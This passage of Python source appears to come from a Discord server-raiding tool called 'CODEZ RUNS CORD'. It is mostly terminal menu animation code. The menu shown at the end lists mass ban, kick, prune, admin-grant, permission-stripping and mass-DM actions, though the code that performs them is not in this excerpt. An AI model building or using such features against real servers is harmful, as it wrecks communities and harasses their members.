                pad = max((console_width - len(line)) // 2, 0)
                out += " " * pad
                for c_idx, ch in enumerate(line):
                    if ch == " ":
                        out += " "
                        continue
                    reveal_chance = max(0.0, min(1.0, (t * 2.5) - (r_idx/total_lines)))
                    if random.random() < reveal_chance:
                        h_blend = c_idx / max(len(line)-1, 1)
                        cr = int(mode_start[0]*(1-h_blend) + mode_end[0]*h_blend)
                        cg = int(mode_start[1]*(1-h_blend) + mode_end[1]*h_blend)
                        cb = int(mode_start[2]*(1-h_blend) + mode_end[2]*h_blend)
                        out += f"\033[1m\033[38;2;{cr};{cg};{cb}m{ch}"
                    else:
                        if random.random() < 0.1 * t:
                            out += f"\033[38;2;100;100;255m{random.choice('01#*')}"
                        else:
                            out += " "
                sys.stdout.write(out + "\033[0m\n")
            sys.stdout.flush()
            await asyncio.sleep(0.03)
        skipper.stop()
        if skipper.should_skip:
             os.system("cls") if os.name == "nt" else os.system("clear")

    async def _wizzler_menu_load_2(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """WIZZLER MENU 2: Plasma Wave Sweep"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear")
        skipper = _AnimationSkipper(required_presses=2)
        skipper.start()

        full_text = banner_lines + info_lines + options_raw.split('\n')
        total_lines = len(full_text)
        
        frames = 30
        for frame in range(frames):
            if skipper.should_skip: break
            sys.stdout.write("\033[H")
            t = frame / frames
            wave_x = t * (console_width + 40) - 20
            
            for r_idx, line in enumerate(full_text):
                out = ""
                pad = max((console_width - len(line)) // 2, 0)
                out += " " * pad
                for c_idx, ch in enumerate(line):
                    if ch == " ":
                        out += " "
                        continue
                    
                    dist = abs((pad + c_idx) - wave_x)
                    h_blend = c_idx / max(len(line)-1, 1)
                    cr = int(mode_start[0]*(1-h_blend) + mode_end[0]*h_blend)
                    cg = int(mode_start[1]*(1-h_blend) + mode_end[1]*h_blend)
                    cb = int(mode_start[2]*(1-h_blend) + mode_end[2]*h_blend)
                    
                    if (pad + c_idx) < wave_x:
                        glow = max(1.0, 2.0 - dist/8.0)
                        out += f"\033[1m\033[38;2;{min(255,int(cr*glow))};{min(255,int(cg*glow))};{min(255,int(cb*glow))}m{ch}"
                    elif dist < 12 and random.random() < 0.4:
                        out += f"\033[38;2;255;255;255m{random.choice('≈~°')}"
                    else:
                        out += " "
                sys.stdout.write(out + "\033[0m\n")
            sys.stdout.flush()
            await asyncio.sleep(0.04)
        skipper.stop()
        if skipper.should_skip: os.system("cls") if os.name == "nt" else os.system("clear")

    async def _wizzler_menu_load_3(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """WIZZLER MENU 3: Constellation Map Build"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear")
        skipper = _AnimationSkipper(required_presses=2)
        skipper.start()

        full_text = banner_lines + info_lines + options_raw.split('\n')
        total_lines = len(full_text)
        
        frames = 25
        for frame in range(frames):
            if skipper.should_skip: break
            sys.stdout.write("\033[H")
            t = frame / frames
            
            for r_idx, line in enumerate(full_text):
                out = ""
                pad = max((console_width - len(line)) // 2, 0)
                out += " " * pad
                for c_idx, ch in enumerate(line):
                    if ch == " ":
                        out += " "
                        continue
                    
                    intensity = 0.1 + 0.9 * t
                    h_blend = c_idx / max(len(line)-1, 1)
                    cr = int(mode_start[0]*(1-h_blend) + mode_end[0]*h_blend)
                    cg = int(mode_start[1]*(1-h_blend) + mode_end[1]*h_blend)
                    cb = int(mode_start[2]*(1-h_blend) + mode_end[2]*h_blend)
                    
                    if random.random() < t * 1.5:
                        out += f"\033[1m\033[38;2;{cr};{cg};{cb}m{ch}"
                    else:
                        if random.random() < 0.05:
                            out += f"\033[1m\033[38;2;200;200;255m*"
                        else:
                            out += " "
                sys.stdout.write(out + "\033[0m\n")
            sys.stdout.flush()
            await asyncio.sleep(0.03)
        skipper.stop()
        if skipper.should_skip: os.system("cls") if os.name == "nt" else os.system("clear")

    async def _wizzler_menu_load_4(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """WIZZLER MENU 4: Holographic Scan"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear")
        skipper = _AnimationSkipper(required_presses=2)
        skipper.start()

        full_text = banner_lines + info_lines + options_raw.split('\n')
        total_lines = len(full_text)
        
        frames = 30
        for frame in range(frames):
            if skipper.should_skip: break
            sys.stdout.write("\033[H")
            t = frame / frames
            scan_y = int(t * (total_lines + 5))
            
            for r_idx, line in enumerate(full_text):
                out = ""
                pad = max((console_width - len(line)) // 2, 0)
                out += " " * pad
                for c_idx, ch in enumerate(line):
                    if ch == " ":
                        out += " "
                        continue
                    
                    h_blend = c_idx / max(len(line)-1, 1)
                    cr = int(mode_start[0]*(1-h_blend) + mode_end[0]*h_blend)
                    cg = int(mode_start[1]*(1-h_blend) + mode_end[1]*h_blend)
                    cb = int(mode_start[2]*(1-h_blend) + mode_end[2]*h_blend)
                    
                    dist = abs(r_idx - scan_y)
                    if r_idx < scan_y:
                        out += f"\033[1m\033[38;2;{cr};{cg};{cb}m{ch}"
                    elif dist < 3 and random.random() < 0.5:
                        out += f"\033[1m\033[38;2;255;255;255m_"
                    else:
                        out += " "
                sys.stdout.write(out + "\033[0m\n")
            sys.stdout.flush()
            await asyncio.sleep(0.03)
        skipper.stop()
        if skipper.should_skip: os.system("cls") if os.name == "nt" else os.system("clear")


    async def _deadlizer_menu_load_5(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """DEADLIZER MENU 5: Gory Meat Explosion Reveal"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear"); skipper = _AnimationSkipper(2); skipper.start()
        full_text = banner_lines + info_lines + options_raw.split('\n')
        for frame in range(25):
            if skipper.should_skip: break
            sys.stdout.write("\033[H"); t = frame/24
            for r_idx, line in enumerate(full_text):
                out = " " * max(0, (console_width-len(line))//2)
                for c_idx, ch in enumerate(line):
                    if ch == " ": out += " "; continue
                    if random.random() < t*1.2:
                        h = c_idx/max(len(line)-1,1); r = int(mode_start[0]*(1-h)+mode_end[0]*h)
                        out += f"\033[1m\033[38;2;{r};0;0m{ch}"
                    elif random.random() < 0.1: out += f"\033[38;2;200;10;10m{random.choice('+,#')}"
                    else: out += " "
                sys.stdout.write(out + "\033[0m\n")
            sys.stdout.flush(); await asyncio.sleep(0.01)
        skipper.stop()

    async def _deadlizer_menu_load_6(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """DEADLIZER MENU 6: Hellfire Vortex Spiral"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear"); skipper = _AnimationSkipper(2); skipper.start()
        full_text = banner_lines + info_lines + options_raw.split('\n')
        cx, cy = console_width//2, len(full_text)//2
        for frame in range(30):
            if skipper.should_skip: break
            sys.stdout.write("\033[H"); t = frame/29
            for r_idx, line in enumerate(full_text):
                out = " " * max(0, (console_width-len(line))//2)
                for c_idx, ch in enumerate(line):
                    if ch == " ": out += " "; continue
                    dist = math.sqrt(((c_idx+(console_width-len(line))//2)-cx)**2 + ((r_idx-cy)*3)**2)
                    if dist < t * 100:
                        h = c_idx/max(len(line)-1,1); r = int(mode_start[0]*(1-h)+mode_end[0]*h)
                        out += f"\033[1m\033[38;2;{r};20;20m{ch}"
                    elif abs(dist-t*100) < 5: out += f"\033[38;2;255;100;0m{random.choice('^~*')}"
                    else: out += " "
                sys.stdout.write(out + "\033[0m\n")
            sys.stdout.flush(); await asyncio.sleep(0.01)
        skipper.stop()

    async def _deadlizer_menu_load_7(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """DEADLIZER MENU 7: Abyssal Shadow Dissolve"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear"); skipper = _AnimationSkipper(2); skipper.start()
        full_text = banner_lines + info_lines + options_raw.split('\n')
        for frame in range(25):
            if skipper.should_skip: break
            sys.stdout.write("\033[H"); t = frame/24
            for r_idx, line in enumerate(full_text):
                out = " " * max(0, (console_width-len(line))//2)
                for c_idx, ch in enumerate(line):
                    if ch == " ": out += " "; continue
                    if (r_idx/len(full_text)) < t*1.5:
                        h = c_idx/max(len(line)-1,1); r = int(mode_start[0]*(1-h)+mode_end[0]*h); out += f"\033[1m\033[38;2;{r};0;0m{ch}"
                    else: out += f"\033[38;2;30;30;30m{random.choice('█▓▒░')}"
                sys.stdout.write(out + "\033[0m\n")
            sys.stdout.flush(); await asyncio.sleep(0.01)
        skipper.stop()

    async def _deadlizer_menu_load_8(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """DEADLIZER MENU 8: Blood Rain Flooding Reveal"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear"); skipper = _AnimationSkipper(2); skipper.start()
        full_text = banner_lines + info_lines + options_raw.split('\n')
        for frame in range(30):
            if skipper.should_skip: break
            sys.stdout.write("\033[H"); t = frame/29
            for r_idx, line in enumerate(full_text):
                out = " " * max(0, (console_width-len(line))//2)
                for c_idx, ch in enumerate(line):
                    if ch == " ": out += " "; continue
                    if r_idx > (1-t)*len(full_text):
                        h = c_idx/max(len(line)-1,1); r = int(mode_start[0]*(1-h)+mode_end[0]*h); out += f"\033[1m\033[38;2;{r};0;0m{ch}"
                    elif random.random() < 0.1: out += f"\033[38;2;255;0;0m|"
                    else: out += " "
                sys.stdout.write(out + "\033[0m\n")
            sys.stdout.flush(); await asyncio.sleep(0.01)
        skipper.stop()

    async def _deadlizer_menu_load_9(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """DEADLIZER MENU 9: Demon Eye Stare Glitches"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear"); skipper = _AnimationSkipper(2); skipper.start()
        full_text = banner_lines + info_lines + options_raw.split('\n')
        for frame in range(25):
            if skipper.should_skip: break
            sys.stdout.write("\033[H"); t = frame/24
            for r_idx, line in enumerate(full_text):
                out = " " * max(0, (console_width-len(line))//2)
                for c_idx, ch in enumerate(line):
                    if ch == " ": out += " "; continue
                    if random.random() < t:
                        h = c_idx/max(len(line)-1,1); r = int(mode_start[0]*(1-h)+mode_end[0]*h); out += f"\033[1m\033[38;2;{r};10;10m{ch}"
                    elif random.random() < 0.05: out += f"\033[38;2;255;0;0m(◉)"
                    else: out += " "
                sys.stdout.write(out + "\033[0m\n")
            sys.stdout.flush(); await asyncio.sleep(0.01)
        skipper.stop()

    async def _deadlizer_menu_load_10(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """DEADLIZER MENU 10: Shattered Mirror Reconstruction"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear"); skipper = _AnimationSkipper(2); skipper.start()
        full_text = banner_lines + info_lines + options_raw.split('\n')
        for frame in range(30):
            if skipper.should_skip: break
            sys.stdout.write("\033[H"); t = frame/29
            for r_idx, line in enumerate(full_text):
                out = " " * max(0, (console_width-len(line))//2)
                for c_idx, ch in enumerate(line):
                    if ch == " ": out += " "; continue
                    shift = int((1-t)*random.randint(-10,10))
                    if t > 0.5:
                        h = c_idx/max(len(line)-1,1); r = int(mode_start[0]*(1-h)+mode_end[0]*h); out += f"\033[1m\033[38;2;{r};0;0m{ch}"
                    else:
                        m_ch = random.choice('/\\X')
                        out += f"\033[38;2;100;100;100m{m_ch}"
                sys.stdout.write(out + "\033[0 m\n")
            sys.stdout.flush(); await asyncio.sleep(0.01)
        skipper.stop()

    async def _wizzler_menu_load_5(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """WIZZLER MENU 5: Cyberpunk Glitch-Portal"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear"); skipper = _AnimationSkipper(2); skipper.start()
        full_text = banner_lines + info_lines + options_raw.split('\n')
        for frame in range(25):
            if skipper.should_skip: break
            sys.stdout.write("\033[H"); t = frame/24
            for r_idx, line in enumerate(full_text):
                out = " " * max(0, (console_width-len(line))//2)
                for c_idx, ch in enumerate(line):
                    if ch == " ": out += " "; continue
                    if random.random() < t:
                        h = c_idx/max(len(line)-1,1); r = int(mode_start[0]*(1-h)+mode_end[0]*h); out += f"\033[1m\033[38;2;{r};{mode_start[1]};{mode_start[2]}m{ch}"
                    elif random.random() < 0.2: out += f"\033[38;2;0;255;255m{random.choice('ｦｧｨｩｪｫｬｭｮｯ01')}"
                    else: out += " "
                sys.stdout.write(out + "\033[0m\n")
            sys.stdout.flush(); await asyncio.sleep(0.01)
        skipper.stop()

    async def _wizzler_menu_load_6(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """WIZZLER MENU 6: Pixelate & Sharpening"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear"); skipper = _AnimationSkipper(2); skipper.start()
        full_text = banner_lines + info_lines + options_raw.split('\n')
        for frame in range(30):
            if skipper.should_skip: break
            sys.stdout.write("\033[H"); t = frame/29
            for r_idx, line in enumerate(full_text):
                out = " " * max(0, (console_width-len(line))//2)
                for c_idx, ch in enumerate(line):
                    if ch == " ": out += " "; continue
                    if random.random() < t*1.5:
                        h = c_idx/max(len(line)-1,1); r = int(mode_start[0]*(1-h)+mode_end[0]*h); out += f"\033[1m\033[38;2;{r};{mode_start[1]};{mode_start[2]}m{ch}"
                    else: out += f"\033[38;2;{int(50*t)};{int(50*t)};{int(50*t)}m{random.choice('█▓▒░')}"
                sys.stdout.write(out + "\033[0m\n")
            sys.stdout.flush(); await asyncio.sleep(0.01)
        skipper.stop()

    async def _wizzler_menu_load_7(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """WIZZLER MENU 7: Vertical Cascade Flow"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear"); skipper = _AnimationSkipper(2); skipper.start()
        full_text = banner_lines + info_lines + options_raw.split('\n')
        for frame in range(30):
            if skipper.should_skip: break
            sys.stdout.write("\033[H"); t = frame/29
            for r_idx, line in enumerate(full_text):
                out = " " * max(0, (console_width-len(line))//2)
                for c_idx, ch in enumerate(line):
                    if ch == " ": out += " "; continue
                    if r_idx < t * len(full_text):
                        h = c_idx/max(len(line)-1,1); r = int(mode_start[0]*(1-h)+mode_end[0]*h); out += f"\033[1m\033[38;2;{r};{mode_start[1]};{mode_start[2]}m{ch}"
                    elif abs(r_idx - t*len(full_text)) < 3: out += f"\033[38;2;255;255;255m{random.choice('01')}"
                    else: out += " "
                sys.stdout.write(out + "\033[0m\n")
            sys.stdout.flush(); await asyncio.sleep(0.01)
        skipper.stop()

    async def _wizzler_menu_load_8(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """WIZZLER MENU 8: Horizontal Beam Scanlines"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear"); skipper = _AnimationSkipper(2); skipper.start()
        full_text = banner_lines + info_lines + options_raw.split('\n')
        for frame in range(30):
            if skipper.should_skip: break
            sys.stdout.write("\033[H"); t = frame/29
            scan_x = int(t * console_width)
            for r_idx, line in enumerate(full_text):
                out = " " * max(0, (console_width-len(line))//2)
                pad = (console_width-len(line))//2
                for c_idx, ch in enumerate(line):
                    if ch == " ": out += " "; continue
                    if (c_idx+pad) < scan_x:
                        h = c_idx/max(len(line)-1,1); r = int(mode_start[0]*(1-h)+mode_end[0]*h); out += f"\033[1m\033[38;2;{r};{mode_start[1]};{mode_start[2]}m{ch}"
                    elif abs((c_idx+pad) - scan_x) < 10: out += f"\033[38;2;0;255;255m{random.choice('█▓▒░')}"
                    else: out += " "
                sys.stdout.write(out + "\033[0m\n")
            sys.stdout.flush(); await asyncio.sleep(0.01)
        skipper.stop()

    async def _wizzler_menu_load_9(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """WIZZLER MENU 9: Retro Terminal Typing"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear"); skipper = _AnimationSkipper(2); skipper.start()
        full_text = banner_lines + info_lines + options_raw.split('\n')
        for frame in range(35):
            if skipper.should_skip: break
            sys.stdout.write("\033[H"); t = frame/34
            for r_idx, line in enumerate(full_text):
                out = " " * max(0, (console_width-len(line))//2)
                limit = int(t * len(line))
                for c_idx, ch in enumerate(line):
                    if c_idx < limit:
                        h = c_idx/max(len(line)-1,1); r = int(mode_start[0]*(1-h)+mode_end[0]*h); out += f"\033[1m\033[38;2;{r};{mode_start[1]};{mode_start[2]}m{ch}"
                    elif c_idx == limit: out += f"\033[38;2;255;255;255m_"
                    else: out += " "
                sys.stdout.write(out + "\n")
            sys.stdout.flush(); await asyncio.sleep(0.005)
        skipper.stop()

    async def _wizzler_menu_load_10(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """WIZZLER MENU 10: Tetris-Block Construction"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear"); skipper = _AnimationSkipper(2); skipper.start()
        full_text = banner_lines + info_lines + options_raw.split('\n')
        for frame in range(30):
            if skipper.should_skip: break
            sys.stdout.write("\033[H"); t = frame/29
            for r_idx, line in enumerate(full_text):
                out = " " * max(0, (console_width-len(line))//2)
                for c_idx, ch in enumerate(line):
                    if ch == " ": out += " "; continue
                    # Blocks fall from above
                    fall_y = int((1-t)*10 + r_idx)
                    if fall_y == r_idx:
                        h = c_idx/max(len(line)-1,1); r = int(mode_start[0]*(1-h)+mode_end[0]*h); out += f"\033[1m\033[38;2;{r};{mode_start[1]};{mode_start[2]}m{ch}"
                    elif fall_y < len(full_text) and random.random() < 0.2: out += f"\033[38;2;100;100;100m█"
                    else: out += " "
                sys.stdout.write(out + "\033[0m\n")
            sys.stdout.flush(); await asyncio.sleep(0.01)
        skipper.stop()

    async def _menu_banner_animation(self, banner_lines, mode_start, mode_end, console_width):
        total_lines = len(banner_lines)
        centered_lines = [line.center(console_width) for line in banner_lines]
        
        skipper = _AnimationSkipper(required_presses=2)
        skipper.start()

        # 1. Fade In
        for frame in range(12):
            if skipper.should_skip:
                break
            brightness = frame / 11.0
            sys.stdout.write("\033[H")
            for line in centered_lines:
                out = ""
                line_len = len(line)
                for j, char in enumerate(line):
                    if char == " ":
                        out += " "
                        continue
                    ratio = j / max(line_len - 1, 1)
                    r = int((mode_start[0] + (mode_end[0] - mode_start[0]) * ratio) * brightness)
                    g = int((mode_start[1] + (mode_end[1] - mode_start[1]) * ratio) * brightness)
                    b = int((mode_start[2] + (mode_end[2] - mode_start[2]) * ratio) * brightness)
                    out += f"\033[38;2;{r};{g};{b}m{char}"
                sys.stdout.write("\033[1m" + out + "\033[0m\n")
            sys.stdout.flush()
            await asyncio.sleep(0.04)

        # 2. Glowing Pulse
        for frame in range(8):
            if skipper.should_skip:
                break
            sys.stdout.write("\033[H")
            glow = 1.0 + 0.35 * math.sin(frame * math.pi / 4)
            for line in centered_lines:
                out = ""
                line_len = len(line)
                for j, char in enumerate(line):
                    if char == " ":
                        out += " "
                        continue
                    ratio = j / max(line_len - 1, 1)
                    r = min(255, int((mode_start[0] + (mode_end[0] - mode_start[0]) * ratio) * glow))
                    g = min(255, int((mode_start[1] + (mode_end[1] - mode_start[1]) * ratio) * glow))
                    b = min(255, int((mode_start[2] + (mode_end[2] - mode_start[2]) * ratio) * glow))
                    out += f"\033[38;2;{r};{g};{b}m{char}"
                sys.stdout.write("\033[1m" + out + "\033[0m\n")
            sys.stdout.flush()
            await asyncio.sleep(0.07)
            
        skipper.stop()
        # If skipped, make sure the final version is shown
        if skipper.should_skip:
             os.system("cls") if os.name == "nt" else os.system("clear")
             for line in centered_lines:
                out = ""
                line_len = len(line)
                for j, char in enumerate(line):
                    if char == " ":
                        out += " "
                        continue
                    ratio = j / max(line_len - 1, 1)
                    r = int(mode_start[0] + (mode_end[0] - mode_start[0]) * ratio)
                    g = int(mode_start[1] + (mode_end[1] - mode_start[1]) * ratio)
                    b = int(mode_start[2] + (mode_end[2] - mode_start[2]) * ratio)
                    out += f"\033[38;2;{r};{g};{b}m{char}"
                sys.stdout.write("\033[1m" + out + "\033[0m\n")
             sys.stdout.flush()

    async def _menu_details_animation(self, info_lines, options_raw, mode_start, mode_end, console_width):
        import sys, time, math, random
        detail_lines = info_lines + options_raw.split('\n')
        n = len(detail_lines)
        
        # DOUBLE ENTER SKIP
        skipper = _AnimationSkipper(required_presses=2)
        skipper.start()

        glitch_chars = "||||+||++++--|-+|||_"
        sparkle_chars = "+*.:o^"

        # Phase 1: Staggered Glitch Reveal
        reveal_steps = 22
        for step in range(reveal_steps + 1):
            if skipper.should_skip: break
            t = step / reveal_steps
            if step > 0:
                sys.stdout.write(f"\033[{n}A")
            
            for i, line in enumerate(detail_lines):
                row_delay = i * 0.12
                row_t = max(0.0, min(1.0, (t * (reveal_steps + row_delay)) / reveal_steps))
                row_ease = 1 - (1 - row_t)**3 # Cubic ease-out
                
                visible_chars = int(row_ease * len(line))
                pad = (console_width - len(line)) // 2
                
                out = " " * pad
                for j, char in enumerate(line):
                    h_blend = j / max(len(line) - 1, 1)
                    r = int(mode_start[0] * (1 - h_blend) + mode_end[0] * h_blend)
                    g = int(mode_start[1] * (1 - h_blend) + mode_end[1] * h_blend)
                    b = int(mode_start[2] * (1 - h_blend) + mode_end[2] * h_blend)
                    
                    if j < visible_chars:
                        fade = min(1.0, row_t * 2.8) 
                        out += f"\033[38;2;{int(r*fade)};{int(g*fade)};{int(b*fade)}m{char}"
                    elif j == visible_chars and char.strip():
                        # Frontier match: brighter version of current color
                        r_f = min(255, r + 50)
                        g_f = min(255, g + 50)
                        b_f = min(255, b + 50)
                        out += f"\033[38;2;{r_f};{g_f};{b_f}m{random.choice(glitch_chars)}"
                    else:
                        out += " "
                sys.stdout.write("\033[1m" + out + "\033[0m\n")
            sys.stdout.flush()
            await asyncio.sleep(0.02)

        # Identify all options for sparkling effect
        option_pattern = r"<\d+>"
        import re
        
        # Phase 2: Hyper Glow & Global Sparkle
        for frame in range(32):
             if skipper.should_skip: break
             sys.stdout.write(f"\033[{n}A")
             glow_val = math.sin(frame * 0.35) * 0.5 + 0.5
             scanline = (frame * 1.8) % n
             
             for idx, line in enumerate(detail_lines):
                 centered = line.center(console_width)
                 out = ""
                 line_len = len(centered)
                 
                 # Dynamic scanline boost
                 scan_boost = max(0, 1.0 - abs(idx - scanline) / 4.0) * 0.45
                 
                 for j, char in enumerate(centered):
                     if char == " ":
                         out += " "
                         continue
                     ratio = j / max(line_len - 1, 1)
                     r_base = int(mode_start[0] + (mode_end[0] - mode_start[0]) * ratio)
                     g_base = int(mode_start[1] + (mode_end[1] - mode_start[1]) * ratio)
                     b_base = int(mode_start[2] + (mode_end[2] - mode_start[2]) * ratio)

                     # Check if we are inside an option block <XX> or if it's a general option line
                     # For coolness, sparkle on ANY non-border character in option lines
                     is_option_content = ("<" in line and ">" in line) and not char in "│╭╮╯╰─├┤"
                     
                     if is_option_content:
                         hue_shift = math.sin(frame * 0.45 + j * 0.15) * 70 * glow_val
                         r = min(255, max(0, int(r_base + hue_shift + scan_boost * 255)))
                         g = min(255, max(0, int(g_base + hue_shift * 0.4 + scan_boost * 255)))
                         b = min(255, max(0, int(b_base + hue_shift * 1.6 + scan_boost * 255)))
                         
                         if random.random() < 0.08:
                             # Sparkle color matched to UI gradient but boosted for glitter effect
                             max_val = max(r_base, g_base, b_base, 1)
                             r_s = min(255, int(r_base * (255/max_val)))
                             g_s = min(255, int(g_base * (255/max_val)))
                             b_s = min(255, int(b_base * (255/max_val)))
                             out += f"\033[38;2;{r_s};{g_s};{b_s}m{random.choice(sparkle_chars)}"
                         else:
                             out += f"\033[38;2;{r};{g};{b}m{char}"
                     else:
                         breathe = 0.85 + 0.15 * glow_val + scan_boost
                         out += f"\033[38;2;{min(255,int(r_base*breathe))};{min(255,int(g_base*breathe))};{min(255,int(b_base*breathe))}m{char}"
                 sys.stdout.write("\033[1m" + out + "\033[0m\n")
             sys.stdout.flush()
             await asyncio.sleep(0.035)
        
        skipper.stop()
        # Clean render
        sys.stdout.write(f"\033[{n}A")
        for line in detail_lines:
            sys.stdout.write(gradient_text(line.center(console_width), mode_start, mode_end, bold=True) + "\n")
        sys.stdout.flush()

    async def _menu_exit_animation(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        import sys, time, math, random
        # Combine all parts of the UI
        ui_lines = banner_lines + info_lines + options_raw.split('\n') + ["", ""]
        n = len(ui_lines)
        
        skipper = _AnimationSkipper(required_presses=2)
        skipper.start()
        
        glitch_chars = "X#?%$@&!01"
        
        for frame in range(15):
            if skipper.should_skip: break
            t = frame / 14.0
            # Move to start of UI (input lines are below)
            sys.stdout.write(f"\033[{n+1}A")
            
            for idx, line in enumerate(ui_lines):
                centered = line.center(console_width)
                out = ""
                for j, char in enumerate(centered):
                    if not char.strip():
                        out += " "
                        continue
                    
                    # Digital Disintegration effect
                    # Chance to disappear or glitch increases with t
                    if random.random() < t:
                        if random.random() < (1.0 - t) * 0.4:
                             # UI-matched glitch colors
                             ratio = j / max(len(centered) - 1, 1)
                             r_g = min(255, int(mode_start[0] * (1 - ratio) + mode_end[0] * ratio) + 100)
                             g_g = min(255, int(mode_start[1] * (1 - ratio) + mode_end[1] * ratio) + 100)
                             b_g = min(255, int(mode_start[2] * (1 - ratio) + mode_end[2] * ratio) + 100)
                             out += f"\033[38;2;{r_g};{g_g};{b_g}m{random.choice(glitch_chars)}"
                        else:
                             out += " "
                    else:
                        ratio = j / max(len(centered) - 1, 1)
                        r = int((mode_start[0] * (1 - ratio) + mode_end[0] * ratio) * (1 - t))
                        g = int((mode_start[1] * (1 - ratio) + mode_end[1] * ratio) * (1 - t))
                        b = int((mode_start[2] * (1 - ratio) + mode_end[2] * ratio) * (1 - t))
                        out += f"\033[38;2;{r};{g};{b}m{char}"
                sys.stdout.write("\033[1m" + out + "\033[0m\n")
            sys.stdout.flush()
            await asyncio.sleep(0.03)
            
        skipper.stop()
        os.system("cls") if os.name == "nt" else os.system("clear")

    async def _menu_animator(self):
        import sys, math
        frame = 0
        # Character set for brightness boost (borders and ASCII art blocks)
        highlight_chars = "╭─╮│├┬┤╰╯┴┼╔═╗║╠╦╣╚╩╝║╚╝╠╣║│─╬╩╦╣╚╝╔╗█░▒▓▄▀_\\/|()[]"
        
        while self._animating:
            try:
                banner_lines, info_lines, options_raw, mode_start, mode_end, console_width = self.last_ui
                opt_list = options_raw.splitlines()
                
                # We animate everything: Banner -> Info -> Options
                all_lines = banner_lines + info_lines + opt_list
                
                # Save cursor position, hide cursor during redraw
                frame_buffer = "\033[s\033[?25l"
                
                # Jump to top-left (Row 1, Col 1)
                frame_buffer += "\033[H"
                
                menu_frame = []
                for i, line in enumerate(all_lines):
                    centered = line.center(console_width)
                    line_chars = []
                    last_rgb = None
                    
                    for j, char in enumerate(centered):
                        if char == " ":
                            if last_rgb is not None:
                                line_chars.append("\033[0m")
                                last_rgb = None
                            line_chars.append(" ")
                            continue
                            
                        # Animation wave
                        wave = math.sin(frame * 0.35 + (i + j) * 0.15) * 0.5 + 0.5
                        r_b = int(mode_start[0]*(1-wave) + mode_end[0]*wave)
                        g_b = int(mode_start[1]*(1-wave) + mode_end[1]*wave)
                        b_b = int(mode_start[2]*(1-wave) + mode_end[2]*wave)
                        
                        # Apply brightness boost for structural/art characters
                        if char in highlight_chars:
                            r,g,b = min(255,r_b+125), min(255,g_b+125), min(255,b_b+125)
                        else:
                            r,g,b = min(255,r_b+45), min(255,g_b+45), min(255,b_b+45)
                        
                        this_rgb = (r, g, b)
                        if this_rgb != last_rgb:
                            line_chars.append(f"\033[38;2;{r};{g};{b}m")
                            last_rgb = this_rgb
                        line_chars.append(char)
                    
                    menu_frame.append("\033[1m" + "".join(line_chars) + "\033[0m")
                
                # Join all lines and clear the blank spacer line below the options
                frame_buffer += "\n".join(menu_frame)
                frame_buffer += "\n\033[2K"
                
                # Restore cursor to prompt and show
                frame_buffer += "\033[u\033[?25h"
                sys.stdout.write(frame_buffer)
                sys.stdout.flush()
                frame += 1
                await asyncio.sleep(0.04)
            except Exception:
                await asyncio.sleep(0.1)
            except Exception:
                await asyncio.sleep(0.1)

    async def menu(self):
        while True:
            try:
                console_width = max(os.get_terminal_size().columns, 115)
            except Exception:
                console_width = 115
            pause_seconds = 2.5
            mode_start_t, mode_end_t = get_mode_colors()
            sys.stdout.write("\033[H\033[2J\033[3J")
            sys.stdout.flush()

            if os.name == "nt":
                os.system(f'title CODEZ RUNS CORD')

            if __mode__ == "deadlizer":
                style_idx = random.randrange(len(DEADLIZER_ASCII_STYLES))
                banner_lines = DEADLIZER_ASCII_STYLES[style_idx]
                new_banner = "\n".join(
                    gradient_text(line.center(console_width), DEADLIZER_START, DEADLIZER_END, bold=True)
                    for line in banner_lines)
                mode_start, mode_end = DEADLIZER_START, DEADLIZER_END
            else:
                style_idx = random.randrange(len(WIZZLER_ASCII_STYLES))
                banner_lines = WIZZLER_ASCII_STYLES[style_idx]
                new_banner = "\n".join(
                    gradient_text(line.center(console_width), WIZZLER_START, WIZZLER_END, bold=True)
                    for line in banner_lines)
                mode_start, mode_end = WIZZLER_START, WIZZLER_END
            options_raw_1 = """\
    <Made By Codez>
    ╭───────────────────────────────────────────────────────────────────────────────────────────────────────────╮
    │                                           CODEZ RUNS CORD                                              │
    ├───────────────────────────────────┬───────────────────────────────────┬───────────────────────────────────┤
    │ <01> Ban Members                  │ <12> Nick All                     │ <23> DM All Members               │
    │ <02> Kick Members                 │ <13> Change guild Icon            │ <24> Unban All Members            │
    │ <03> Prune Members                │ <14> Change Guild Name/description│ <25> Strip All Role Perms         │
    │ <04> Create Channels              │ <15> Give Admin                   │ <26> Auto Admin (Select Users)    │
